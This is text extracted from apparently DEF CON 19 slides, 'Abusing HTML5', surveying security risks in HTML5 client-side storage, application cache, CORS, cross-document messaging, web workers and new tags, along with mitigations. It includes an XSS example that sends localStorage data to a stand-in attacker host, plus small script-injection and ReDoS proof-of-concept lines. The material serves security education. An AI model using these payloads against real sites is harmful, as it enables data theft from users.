Abusing  HTML5  
DEF  CON  19   Ming  Chow   Lecturer,  Department  of  Computer  Science   TuCs  University   Medford,  MA  02155   mchow@cs.tuCs.edu  

What  is  HTML5?  
· The  next  major  revision  of  HTML.  To  replace  XHTML?  Yes   · Close  enough  to  a  full--fledged  development  environment   · The  three  aspects  of  HTML5:  
­ Content  (HTML)   ­ PresentaYon  of  content  (CSS)   ­ InteracYon  with  content  (JavaScript)  
· S"ll  work  in  progress   · Backing  from  Google,  MicrosoC,  and  of  course  Apple   · Currently  supported  (not  100%)  in  Chrome,  Firefox  3.5+,  Opera,  
Internet  Explorer  8,  and  Safari   · Many  incompaYbiliYes  exist;  perform  a  browser  test  via  
hdp://www.html5test.com   · Will  be  flexible  with  error  handling  (i.e.,  incorrect  syntax).  Older  
browsers  will  safely  ignore  the  new  HTML5  syntax.  

HTML5:  What's  In?  What's  Out?  
· In:  
­ New  tags,  including  <button>,  <video>,  <audio>,  <article>,  <footer>,  <nav> ­ New  adributes  for  tags  such  as  autocomplete,  autofocus,  pattern  (yes,  regex)  for  
input   ­ New  media  events   ­ New  <canvas>  tag  for  2D  rendering   ­ New  form  controls  for  date  and  Yme   ­ GeolocaYon   ­ New  selectors   ­ Client--side  storage  including  localStorage,  sessionStorage,  and  Web  SQL  
· Out:  
­ PresentaYon  elements  such  as  <font>,  <center> ­ PresentaYon  adributes  including  align,  border ­ <frame>,  <frameset> ­ <applet> ­ Old  special  effects:  <marquee>,  <bgsound> ­ <noscript>

Quick  Demos  
· Video  capYoning   · Canvas   · GeolocaYon  

Structure  of  an  HTML5  Document  
<!DOCTYPE html> <html> <head> <title>An HTML Document</title> ... ... ... </head>
<body> <p>Everything that you practically know of stays the same</p> ... ... </body> </html>

Areas  of  Concern  
· The  adack  surface:  client--side   · Client--side  and  offline  storage  
­ No  longer  just  cookies  and  sessions   ­ Compared  to  cookies  and  sessions,  allows  for  greater  amount  of  
data  to  be  stored   ­ What  if  client's  database  synchronizes  with  producYon  database  
on  server  and  client's  database  contains  malicious?    
· Cross--origin  JavaScript  requests   · Sending  messages  from  one  document  to  another  (on  
another  domain)   · Holy  smokes,  background  computaYonal  power!   · The  complexity  of  HTML5  making  the  browser  worse     

localStorage  and  
sessionStorage
· Provides  key--value  mappings  (currently,  string--to--string  mappings)   · Very  much  like  cookies.   · Differences:  
­ Cookies  =>  4  KB;  localStorage  =>  depends  on  browser  (usually  in  MB)   ­ Unlike  cookies,  sessionStorage  and  localStorage  data  are  NOT  sent  to  
server!   ­ sessionStorage  data  confined  to  browser  window  that  it  was  created  in,  lasts  
unYl  browser  is  closed   ­ localStorage  has  longer  persistence,  can  last  even  aCer  browser  is  closed  
· Trivial  to  use:  
­ (localStorage | sessionStorage).setItem() ­ (localStorage | sessionStorage).getItem() ­ (localStorage | sessionStorage).deleteItem()
· Or  use  associaYve  array  syntax  for  localStorage  or   sessionStorage

Hardly  Any  Security  with  localStorage   or  sessionStorage
· If  you  have  an  XSS  vulnerability  in  your  applicaYon,   anything  stored  in  localStorage  is  available  to   an  adacker.  
· Example:  <script>document.write("<img src='http://attackersite.com? cookie="+localStorage.getItem('phras e')+"'>");</script>
· Never  a  good  idea  to  use  store  sensiYve  data  locally.   · Someone  with  access  to  your  machine  can  read  
everything  (via  Chrome  Developer  Tools  or  Firebug)  

Web  SQL  
· Brings  SQL  to  the  client--side   · Not  new:  see  Google  Gears   · Core  methods:  
­ openDatabase("Database Name", "Database Version", "Database Description", "Estimated Size");
­ transaction("YOUR SQL STATEMENT HERE"); ­ executeSql();
· Prepared  statements  supported   · The  usual  gang  of  adacks:  XSS,  SQL  injecYon   · Demos  

Web  SQL  (conYnued)  
· The  usual  gang  of  prevenYons:  
­ Use  prepared  statements   ­ Output  encoding  (before  storing  data  and  aCer  fetching  
data)  
· New  wrenches:  
­ Do  not  store  sensiYve  data  in  client--side  database   ­ Like  localStorage  and  sessionStorage,  someone  
with  access  to  your  machine  can  read  everything  (via   Chrome  Developer  Tools  or  Firebug)   ­ Can  you  really  trust  what  is  stored  on  client--side  database?   ­ Create  database  and  store  data  over  SSL   ­ Ask  user  for  permission  before  creaYng  and  storing  local   database  

ApplicaYon  Cache  
· Useful  for  offline  browsing,  speed,  and  reduce  server  load   · The  size  limit  for  cached  data  for  a  site:  5  MB   · Example  1A,  enabling  applicaYon  cache:  
<html manifest="example.manifest"> ... </html>
· Example  1B,  the  manifest  file  (example.manifest):  
CACHE MANIFEST # 2010-06-18:v2
# Explicitly cached entries CACHE: index.html stylesheet.css images/logo.png scripts/main.js

ApplicaYon  Cache  (conYnued)  
· Example  2,  updaYng  ApplicaYon  Cache:   applicationCache.addEventListener('checking', updateCacheStatus, false);

Poisoning  the  ApplicaYon  Cache    
· Any  website  can  create  a  cache  on  the  user's   computer  
· No  permission  required  before  allowing  a  site  to   create  an  applicaYon  cache  in  Chrome  or  Safari  
· Any  file  can  be  cached  including  the  root  file  "/"   · The  catch:  even  if  a  root  resource  is  cached  
normally  and  on  refresh,  the  normal  cache  is   updated  but  not  the  ApplicaYon  Cache   · Read:   hdp://blog.andlabs.org/2010/06/chrome--and-- safari--users--open--to--stealth.html  

Cross--Origin  JavaScript  Requests  (or  
Cross--Origin  Resource  Sharing)  
· Not  directly  part  of  HTML5  but  introduced  by  W3C   · XDomainRequest()  created  by  MicrosoC  in  Internet  Explorer  8   · In  some  cases,  XMLHttpRequest()  now  allow  cross--domain  
requests  (Firefox  3.5+  and  Safari  4+)   · Caveat:  consent  between  web  page  and  the  server  is  required.  
­ Server  must  respond  with  an  Access-Control-Allow-Origin  header  of   either  *  (a.k.a.,  universal  allow,  not  good!)  or  the  exact  URL  of  the  requesYng  page   (site--level;  white--list)  
­ Example  1  (BAD!):  header('Access-Control-Allow-Origin: *'); ­ Example  2  (BAD!):  Access-Control-Allow-Origin: http://
allowed.origin/page?cors=other.allowed.origin %20malicious.spoof
· ResoluYons:  
­ Add  some  form  of  authenYcaYon  /  credenYals  checking  (e.g.,  cookie)   ­ Validate  response  

Cross--Document  Messaging  
· Establish  a  communicaYon  channel  between  frames  in  different  origins   · Requires  sender  and  receiver   · Sender:  window.postMessage("message", "targetOrigin"); · Demo   · Watch  out!    If  you  are  the  receiver  of  a  message  from  another  site,  verify  the  
sender's  idenYty  using  the  origin  property.    Example  (receiver):  
window.addEventListener("message", receiveMessage, false); function receiveMessage(event) {
if (event.origin !== "http://example.org") { ... ... ... } }
  

Web  Workers  
· Very  powerful  stuff;  allows  background  computaYonal  tasks  via   JavaScript  ----think  threads  
· Really  simple:  instanYate  a  Worker  object  in  JavaScript   · Example:  var w = new Worker("some_script.js"); · w.onmessage = function(e) { // do something }; · To  terminate  a  worker:  w.terminate(); · Caveat:  web  workers  cannot  run  locally  (i.e.,  file:///)   · Same--origin  security  principle  applies   · Things  that  a  worker  have  access  to:  XHR,  navigator  object,  applicaYon  
cache,  spawn  other  workers!   · Things  that  a  worker  does  not  have  access  to:  DOM,  window,  document  
objects   · What  you  could  do  with  a  worker:  use  your  wildest  imaginaYon...  

But  What  About  the  New  HTML5  Tags  
and  Adributes?  
· Depends  on  browser,  spec  of  codec  or  format   · NaYve  audio  and  video  rendering  (read:  <video>  and  <audio>).    What  if  there  
are  flaws  in  the  codec?   · On  some  browsers  (e.g,  Firefox  <  4),  you  can  embed  JavaScript  as  value  of  on  error  
adribute  of  <video>  or  <audio>  with  <source> · Example:  <audio onerror="javascript:alert('ugh!')"><source
src="uhoh.mp3" /></audio> · Heap  buffer  overflow  via  transformaYons  and  painYng  in  HTML5  canvas  in  Opera.  
hdp://www.opera.com/support/kb/view/966/  (fixed)   · What  if  an  inline  SVG  call  contains  JavaScript  and  HTML?    Example  (this  works  in  
Firefox  <  4  but  not  in  Chrome  <  7):  <svg xmlns="http://www.w3.org/ 2000/svg"><script>alert(1)</script></svg> · PotenYal  client--side  ReDoS  via  padern  adribute  in  input  (Opera  10+)  
­ Example:  <input pattern="^((a+.)a)+$" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..." />  

Summary  
· A  lot  of  same  old  problems,  same  old  resoluYons   (read:  common  sense,  input  validaYon,  be  careful   connecYng  to  an  unsecured  network  /  public  Wi-- Fi)  
· Important  to  remember:  HTML5  standard  is  sYll   work--in--progress,  being  finalized,  and  evolving...  
· ...but  at  the  same  Yme,  the  spike  of  i{Phone,  Pod   Touch,  Pad},  Android,  and  other  mobile  devices   that  do  not  support  Flash  has  spurred  the  growth   and  interest  in  HTML5.    Alas,  HTML5  and  its   security  issues  cannot  be  ignored.  

References  and  Resources  
· HTML5  
­ hdp://www.html5rocks.com/   ­ hdp://html5doctor.com/introducing--web--sql--databases/   ­ hdp://www.webreference.com/authoring/languages/html/HTML5--Client--Side/  
· HTML5  Security  
­ hdp://www.darkreading.com/vulnerability--management/167901026/security/applicaYon--security/ 224701560/index.html  
­ hdp://www.nyYmes.com/external/idg/2010/08/20/20idg--html5--raises--new--security--issues--59174.html   ­ hdp://www.veracode.com/blog/2010/05/html5--security--in--a--nutshell/   ­ hdp://www.eweek.com/c/a/Security/HTML5--Security--Facts--Developers--Should--Keep--in--Mind--551353/   ­ hdp://threatpost.com/en_us/blogs/security--concern--html5--gains--tracYon--091610   ­ hdp://stackoverflow.com/quesYons/787067/is--there--a--xdomainrequest--equivalent--in--firefox   ­ hdp://www.andlabs.org/html5.html   ­ hdp://heideri.ch/jso/   ­ hdp://code.google.com/p/html5security/   ­ hdp://michael--coates.blogspot.com/2010/07/html5--local--storage--and--xss.html   ­ hdp://spareclockcycles.org/2010/12/19/d0z--me--the--evil--url--shortener/   ­ hdp://blogs.forbes.com/andygreenberg/2010/11/04/html5--tricks--hijack--browsers--to--crack--passwords--
spew--spam/   ­ hdp://mashable.com/2011/04/29/html5--web--security/  

